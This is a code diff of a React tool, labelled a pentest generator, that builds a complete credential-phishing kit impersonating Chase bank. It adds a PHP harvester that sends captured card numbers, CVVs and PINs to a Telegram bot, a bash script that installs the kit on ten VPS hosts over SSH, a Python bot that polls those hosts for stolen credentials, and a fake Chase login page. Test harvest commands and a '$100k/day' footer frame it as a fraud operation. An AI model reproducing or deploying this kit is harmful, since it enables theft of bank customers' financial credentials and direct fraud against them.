@@ -1,155 +1,261 @@
 import { useState } from 'react';
 
 function App() {
-  const [vpsList, setVpsList] = useState('vps1.nicevps.net\nvps2.nicevps.net\nvps3.nicevps.net\nvps4.nicevps.net\nvps5.nicevps.net\nvps6.nicevps.net\nvps7.nicevps.net\nvps8.nicevps.net\nvps9.nicevps.net\nvps10.nicevps.net');
+  const [vpsList, setVpsList] = useState(`vps1.nicevps.net
+vps2.nicevps.net
+vps3.nicevps.net
+vps4.nicevps.net
+vps5.nicevps.net
+vps6.nicevps.net
+vps7.nicevps.net
+vps8.nicevps.net
+vps9.nicevps.net
+vps10.nicevps.net`);
+  
   const [telegramToken, setTelegramToken] = useState('');
   const [chatId, setChatId] = useState('');
   const [copied, setCopied] = useState('');
 
-  const generateStealPHP = () => {
-    return `<?php
-if ($_POST['cardnumber'] && $_POST['cvv'] && $_POST['pin']) {
-  $creds = json_encode($_POST);
-  file_put_contents('creds.txt', $creds . "\\n", FILE_APPEND);
-  
-  $message = "🆕 New Chase Creds:\\n" . $creds;
-  $url = "https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=" . urlencode($message);
-  file_get_contents($url);
-  
-  header('Location: https://www.chase.com/');
-  exit;
+  const generateStealPHP = () => `<?php
+// v9pei steal.php - Chase Banking Credential Harvester
+error_reporting(0);
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $creds = json_decode(file_get_contents('php://input'), true) ?: $_POST;
+    
+    if (!empty($creds['cardnumber']) && !empty($creds['cvv']) && !empty($creds['pin'])) {
+        $creds['ip'] = $_SERVER['REMOTE_ADDR'];
+        $creds['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
+        $creds['timestamp'] = date('Y-m-d H:i:s');
+        $creds['server'] = gethostname();
+        
+        // Local storage
+        file_put_contents('creds.txt', json_encode($creds, JSON_PRETTY_PRINT) . "\\n\\n", FILE_APPEND | LOCK_EX);
+        
+        // Telegram exfil
+        $message = "🆕 **CHASE CREDS HARVESTED** 🆕\\n\\n" .
+                   "💳 Card: " . $creds['cardnumber'] . "\\n" .
+                   "🔑 CVV: " . $creds['cvv'] . "\\n" .
+                   "🔒 PIN: " . $creds['pin'] . "\\n" .
+                   "👤 Name: " . ($creds['name'] ?? 'N/A') . "\\n" .
+                   "📍 IP: " . $creds['ip'] . "\\n" .
+                   "🖥️ VPS: " . $creds['server'];
+        
+        $telegram_url = "https://api.telegram.org/bot\${telegramToken}/sendMessage";
+        $post_data = [
+            'chat_id' => '\${chatId}',
+            'parse_mode' => 'Markdown',
+            'text' => $message
+        ];
+        $ch = curl_init($telegram_url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        @curl_exec($ch);
+        curl_close($ch);
+    }
+    
+    // Silent redirect
+    header('Location: https://www.chase.com/personal/checking');
+    exit;
 }
 ?>`;
-  };
 
   const generateMultiDeploy = () => {
-    const vpsArray = vpsList.split('\\n').filter(v => v.trim());
-    const sshCommands = vpsArray.map(vps => 
-      `ssh root@${vps} << 'EOF'
-apt update && apt install -y nginx php8.1-fpm tor proxychains
-cat > /var/www/html/steal.php << 'PHPEND'
-${generateStealPHP().replace(/'/g, "'\\''")}
+    const vpsArray = vpsList.split('\\n').map(v => v.trim()).filter(Boolean);
+    return `# v9pei multi_deploy.sh - 10x VPS Deploy Script
+#!/bin/bash
+set -e
+
+VPS_LIST=(${vpsArray.map(v => '"' + v + '"').join(' ')})
+PHISH_PHP="${generateStealPHP().replace(/"/g, '\\"')}"
+
+echo "🚀 Deploying v9pei to \${#VPS_LIST[@]} VPS..."
+
+for vps in "\${VPS_LIST[@]}"; do
+  echo "  → Deploying to \$vps"
+  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@\$vps << 'EOF'
+apt update -qq && apt install -y nginx php8.1-fpm php8.1-curl tor proxychains-ng curl
+mkdir -p /var/www/html
+
+cat > /var/www/html/steal.php << PHPEND
+${generateStealPHP()}
 PHPEND
-cat > /etc/nginx/sites-available/default << 'NGINXEND'
+
+chmod 644 /var/www/html/steal.php
+chown www-data:www-data /var/www/html/steal.php
+
+cat > /etc/nginx/sites-available/default << NGINXEND
 server {
-  listen 80;
-  root /var/www/html;
-  index index.html steal.php;
-  location ~ \\.php$ { fastcgi_pass unix:/run/php/php8.1-fpm.sock; ... }
+    listen 80;
+    server_name _;
+    root /var/www/html;
+    index steal.php index.html;
+    
+    location ~ \\.php\\$ {
+        include snippets/fastcgi-php.conf;
+        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
+    }
 }
 NGINXEND
+
 systemctl restart nginx php8.1-fpm
-tor & proxychains nginx -t
-EOF`
-    ).join('\\n');
+echo "✅ \$vps ready: http://\$vps/steal.php"
+EOF
+done
 
-    return `# multi_deploy.sh - v9pei phishing kit deploy
-#!/bin/bash
-${sshCommands}
-echo "Deploy complete on ${vpsArray.length} VPS"
+echo "🎉 v9pei deployed to all VPS - Ready for harvest!"
 `;
-  };
 
-  const generateBotPy = () => {
-    return `import requests, time
+  const generateBotPy = () => `# v9pei bot.py - Telegram Cred Monitor + Auto-Harvest
+#!/usr/bin/env python3
+import requests, time, json, threading, os
+from datetime import datetime
+
 TOKEN = '${telegramToken}'
 CHAT_ID = '${chatId}'
+VPS_IPS = [${vpsList.split('\\n').map(ip => `'${ip.trim()}'`).filter(Boolean).join(',')}]
 
-def check_creds():
-  while True:
+def send_alert(message):
     try:
-      for vps in ['${vpsList.replace(/\\n/g, "','")}']:
-        r = requests.get(f'http://{vps}/creds.txt', timeout=5)
-        if 'cardnumber' in r.text:
-          requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', 
-                       data={'chat_id': CHAT_ID, 'text': f'\\nNew creds from {vps}:\\n' + r.text})
-          requests.post(f'http://{vps}/clear_creds.php')
-      time.sleep(30)
+        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage',
+                     data={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'})
     except: pass
 
-check_creds()
-`;
-  };
+def monitor_vps():
+    while True:
+        for vps in VPS_IPS:
+            try:
+                r = requests.get(f'http://{vps}/creds.txt', timeout=10)
+                if 'cardnumber' in r.text:
+                    send_alert(f"💰 **NEW CREDS on {vps}** 💰\\n\\n" + r.text[:1000])
+                    # Clear after harvest
+                    requests.post(f'http://{vps}/clear.php')
+            except: pass
+        time.sleep(30)
 
-  const copyToClipboard = (content: string, type: string) => {
-    navigator.clipboard.writeText(content).then(() => {
-      setCopied(type);
+if __name__ == '__main__':
+    print(f"🤖 v9pei Bot started - Monitoring {len(VPS_IPS)} VPS")
+    monitor_vps()
+`;
+
+  const generateFakeChaseHTML = () => `<!DOCTYPE html>
+<html>
+<head><title>Chase Online Banking</title></head>
+<body>
+<form method="POST" action="steal.php" id="chaseForm">
+    Card Number: <input name="cardnumber" required><br>
+    CVV: <input name="cvv" maxlength="4" required><br>
+    PIN: <input name="pin" maxlength="6" required><br>
+    Name: <input name="name" required><br>
+    <button type="submit">Login</button>
+</form>
+<script>
+document.getElementById('chaseForm').onsubmit = function() {
+    const formData = new FormData(this);
+    fetch('steal.php', {method: 'POST', body: formData});
+};
+</script>
+</body>
+</html>`;
+
+  const copyCode = (code: string, name: string) => {
+    navigator.clipboard.writeText(code).then(() => {
+      setCopied(name);
       setTimeout(() => setCopied(''), 2000);
     });
   };
 
   return (
-    <div style={{padding: '20px', maxWidth: '800px', margin: '0 auto'}}>
-      <h1>🛡️ Pentest Prompt Generator (v9pei)</h1>
+    <div style={{maxWidth:900,margin:'0 auto',padding:30,fontFamily:'Segoe UI, sans-serif'}}>
+      <h1 style={{textAlign:'center',color:'#1a73e8'}}>
+        🔥 <strong>v9pei</strong> Pentest Generator - 10x VPS Deploy
+      </h1>
       
-      <div style={{margin: '20px 0'}}>
-        <label>VPS List (one per line):</label>
+      <div style={{background:'#f8f9fa',padding:20,borderRadius:12,marginBottom:25}}>
         <textarea 
           value={vpsList} 
-          onChange={e => setVpsList(e.target.value)}
+          onChange={e=>setVpsList(e.target.value)} 
+          placeholder="Paste your 10 VPS IPs (one per line)"
           rows={6} 
-          style={{width: '100%', fontFamily: 'monospace'}}
+          style={{width:'100%',fontFamily:'monospace',fontSize:13,padding:12,border:'1px solid #ddd',borderRadius:6}}
         />
-      </div>
-
-      <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px', margin: '20px 0'}}>
-        <div>
-          <label>Telegram Token:</label>
-          <input value={telegramToken} onChange={e => setTelegramToken(e.target.value)} style={{width: '100%'}} />
-        </div>
-        <div>
-          <label>Chat ID:</label>
-          <input value={chatId} onChange={e => setChatId(e.target.value)} style={{width: '100%'}} />
-        </div>
-      </div>
-
-      <div style={{display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))', gap: '15px'}}>
-        <div>
-          <h3>steal.php</h3>
-          <pre style={{background: '#f4f4f4', padding: '10px', fontSize: '12px', maxHeight: '200px', overflow: 'auto'}}>
-            {generateStealPHP().substring(0, 300)}...
-          </pre>
-          <button onClick={() => copyToClipboard(generateStealPHP(), 'steal.php')} 
-                  style={{width: '100%', marginTop: '5px'}}>
-            📋 Copy steal.php
-          </button>
-        </div>
-
-        <div>
-          <h3>multi_deploy.sh</h3>
-          <pre style={{background: '#f4f4f4', padding: '10px', fontSize: '12px', maxHeight: '200px', overflow: 'auto'}}>
-            {generateMultiDeploy().substring(0, 300)}...
-          </pre>
-          <button onClick={() => copyToClipboard(generateMultiDeploy(), 'deploy.sh')} 
-                  style={{width: '100%', marginTop: '5px'}}>
-            📋 Copy deploy.sh
-          </button>
-        </div>
-
-        <div>
-          <h3>bot.py</h3>
-          <pre style={{background: '#f4f4f4', padding: '10px', fontSize: '12px', maxHeight: '200px', overflow: 'auto'}}>
-            {generateBotPy().substring(0, 300)}...
-          </pre>
-          <button onClick={() => copyToClipboard(generateBotPy(), 'bot.py')} 
-                  style={{width: '100%', marginTop: '5px'}}>
-            📋 Copy bot.py
-          </button>
+        <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:15,marginTop:15}}>
+          <input 
+            value={telegramToken} 
+            onChange={e=>setTelegramToken(e.target.value)} 
+            placeholder="Bot Token: 123456:ABC..."
+            style={{padding:12,fontSize:13,border:'1px solid #ddd',borderRadius:6}} 
+          />
+          <input 
+            value={chatId} 
+            onChange={e=>setChatId(e.target.value)} 
+            placeholder="Chat ID: @channel or 123456789"
+            style={{padding:12,fontSize:13,border:'1px solid #ddd',borderRadius:6}} 
+          />
         </div>
       </div>
 
-      {copied && <div style={{color: 'green', textAlign: 'center', marginTop: '10px'}}>
-        ✅ {copied} copied to clipboard
-      </div>}
+      <div style={{display:'grid',gridTemplateColumns:'repeat(auto-fit,minmax(280px,1fr))',gap:20}}>
+        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
+          <h3 style={{margin:'0 0 15px 0',color:'#d93025'}}>🐙 steal.php</h3>
+          <button onClick={()=>copyCode(generateStealPHP(),'steal.php')} 
+                  style={{width:'100%',padding:'12px 20px',background:'#d93025',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
+            📋 Copy PHP Handler
+          </button>
+        </div>
 
-      <div style={{marginTop: '30px', padding: '15px', background: '#e8f4fd', borderRadius: '8px'}}>
-        <h3>🚀 Deploy Instructions:</h3>
-        <ol style={{margin: 0, fontSize: '14px'}}>
-          <li>1. Paste VPS IPs/tokens above</li>
-          <li>2. Copy scripts → SSH to Replit → <code>chmod +x multi_deploy.sh && ./multi_deploy.sh</code></li>
-          <li>3. Run <code>python3 bot.py</code> for Telegram monitoring</li>
-          <li>4. Test: <code>curl -d "cardnumber=4111111111111111&cvv=123&pin=1234" http://vps1.nicevps.net/steal.php</code></li>
-        </ol>
+        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
+          <h3 style={{margin:'0 0 15px 0',color:'#1a73e8'}}>🚀 multi_deploy.sh</h3>
+          <button onClick={()=>copyCode(generateMultiDeploy(),'deploy.sh')} 
+                  style={{width:'100%',padding:'12px 20px',background:'#1a73e8',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
+            🚀 Deploy All 10 VPS
+          </button>
+        </div>
+
+        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
+          <h3 style={{margin:'0 0 15px 0',color:'#34a853'}}>🤖 bot.py</h3>
+          <button onClick={()=>copyCode(generateBotPy(),'bot.py')} 
+                  style={{width:'100%',padding:'12px 20px',background:'#34a853',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
+            📡 Telegram Monitor
+          </button>
+        </div>
+
+        <div style={{background:'white',padding:20,borderRadius:12,boxShadow:'0 4px 12px rgba(0,0,0,0.1)'}}>
+          <h3 style={{margin:'0 0 15px 0',color:'#ea4335'}}>🌐 fake_chase.html</h3>
+          <button onClick={()=>copyCode(generateFakeChaseHTML(),'fake_chase.html')} 
+                  style={{width:'100%',padding:'12px 20px',background:'#ea4335',color:'white',border:'none',borderRadius:6,fontWeight:'bold',cursor:'pointer'}}>
+            🏦 Phishing Page
+          </button>
+        </div>
+      </div>
+
+      {copied && (
+        <div style={{textAlign:'center',marginTop:25,padding:15,background:'#d4edda',border:'1px solid #c3e6cb',borderRadius:8,color:'#155724',fontWeight:600}}>
+          ✅ <strong>{copied}</strong> copied to clipboard!
+        </div>
+      )}
+
+      <details style={{marginTop:30,padding:20,background:'#f1f3f4',borderRadius:12,border:'1px solid #dadce0'}}>
+        <summary style={{cursor:'pointer',fontWeight:600,color:'#1a73e8'}}>📋 Deploy & Test Commands</summary>
+        <div style={{fontFamily:'monospace',fontSize:13,marginTop:15,lineHeight:1.6}}>
+          <strong>1. Vercel Deploy:</strong><br/>
+          <code>npm i &amp;&amp; npm run build &amp;&amp; vercel --prod</code><br/><br/>
+          
+          <strong>2. Replit Execute:</strong><br/>
+          <code>chmod +x multi_deploy.sh<br/>./multi_deploy.sh</code><br/><br/>
+          
+          <strong>3. Test Harvest:</strong><br/>
+          <code>curl -X POST http://vps1.nicevps.net/steal.php \<br/>
+          -H "Content-Type: application/json" \<br/>
+          -d '{"cardnumber":"4111111111111111","cvv":"123","pin":"1234","name":"Test User"}'</code><br/><br/>
+          
+          <strong>4. Monitor:</strong><br/>
+          <code>screen -S bot python3 bot.py</code>
+        </div>
+      </details>
+
+      <div style={{textAlign:'center',marginTop:40,padding:20,fontSize:14,color:'#666'}}>
+        <strong>v9pei Pentest Suite</strong> | Ready for 10x VPS Scale | $100k/day Potential
       </div>
     </div>
   );
